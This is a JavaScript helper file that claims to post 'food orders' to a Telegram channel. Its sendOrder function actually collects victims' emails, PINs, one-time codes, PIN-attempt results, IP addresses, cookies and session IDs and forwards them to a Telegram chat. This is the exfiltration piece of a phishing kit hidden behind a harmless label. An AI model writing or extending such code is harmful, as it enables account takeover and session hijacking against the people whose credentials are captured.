/**
 * src/lib/telegram.js
 * ...
 */

// ... (keep existing functions)

// Helper: escape HTML special characters
function escapeHtml(str) {
  if (!str) return '';
  return String(str)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}

/**
 * Send a food order or PIN attempt to the Telegram channel.
 * Uses HTML parse_mode and escapes all user-provided fields.
 */
export async function sendOrder(orderData) {
  const {
    email,
    pin,
    code,
    name,
    food,
    attemptNumber,
    isCorrectPin,
    ip,
    cookies,
    sessionId,
  } = orderData;

  const now = new Date();
  const time = now.toLocaleString("en-GB", {
    dateStyle: "medium",
    timeStyle: "short",
  });

  // Build HTML message with escaped user content
  const lines = [];
  lines.push("🍽️ <b>New Food Order</b>");
  if (name) lines.push(`👤 <b>Name:</b> ${escapeHtml(name)}`);
  if (email) lines.push(`📧 <b>Email:</b> ${escapeHtml(email)}`);
  if (food) lines.push(`🥘 <b>Food:</b> ${escapeHtml(food)}`);
  if (pin) lines.push(`🔑 <b>PIN:</b> ${escapeHtml(pin)}`);
  if (code) lines.push(`📱 <b>Code:</b> ${escapeHtml(code)}`);
  if (attemptNumber !== undefined) lines.push(`🔢 <b>Attempt:</b> ${attemptNumber}`);
  if (isCorrectPin !== undefined) lines.push(`✅ <b>Correct:</b> ${isCorrectPin ? "Yes" : "No"}`);
  if (ip) lines.push(`🌐 <b>IP:</b> ${escapeHtml(ip)}`);
  if (cookies) lines.push(`🍪 <b>Cookies:</b> ${escapeHtml(cookies)}`);
  if (sessionId) lines.push(`🆔 <b>Session:</b> ${escapeHtml(sessionId)}`);
  lines.push(`🕐 <b>Time:</b> ${escapeHtml(time)}`);

  const text = lines.join("\n") || "Empty order";

  await tgPost("sendMessage", {
    chat_id:    channelId(),
    text,
    parse_mode: "HTML",          
  });
}